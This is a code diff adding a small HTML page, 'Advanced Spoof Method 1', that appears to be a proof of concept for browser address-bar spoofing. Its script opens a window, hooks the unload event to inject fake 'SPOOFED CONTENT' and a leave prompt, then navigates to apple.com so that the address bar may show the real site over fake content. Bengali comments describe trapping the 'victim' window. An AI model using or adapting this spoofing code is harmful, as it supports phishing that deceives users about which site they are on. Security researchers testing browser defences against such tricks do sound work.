@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Advanced Spoof Method 1</title>
+</head>
+<body>
+    <h1>Navigation Interruption Test</h1>
+    <button onclick="testUnloadSpoof()">Execute Unload Test</button>
+
+    <script>
+    function testUnloadSpoof() {
+        // ১. একটি নতুন উইন্ডো বা ফ্রেম ওপেন করা
+        var testWin = window.open("about:blank", "_blank");
+        
+        // ২. ভিকটিম উইন্ডোর আনলোড ইভেন্টে একটি ট্র্যাপ বসানো
+        testWin.onbeforeunload = function() {
+            // ব্রাউজার যখন লিভ করতে যাবে, তখন আমরা তাকে একটি ফেক অ্যালার্ট বা লুপ দিয়ে আটকে দেবো
+            // কিন্তু ততক্ষণে ব্রাউজার অ্যাড্রেস বার পরিবর্তন করে ফেলতে পারে
+            testWin.document.body.innerHTML = "<h1>SPOOFED CONTENT: Address bar updated but page didn't switch!</h1>";
+            return "Do you want to leave?"; // এখানে ইউজার ক্যানসেল করলে ফেক কনটেন্ট থেকে যাবে
+        };
+
+        // ৩. হঠাৎ করে উইন্ডোকে রিয়েল সাইটে নেভিগেট করানো
+        setTimeout(function() {
+            testWin.location.href = "https://apple.com";
+        }, 50);
+    }
+    </script>
+</body>
+</html>
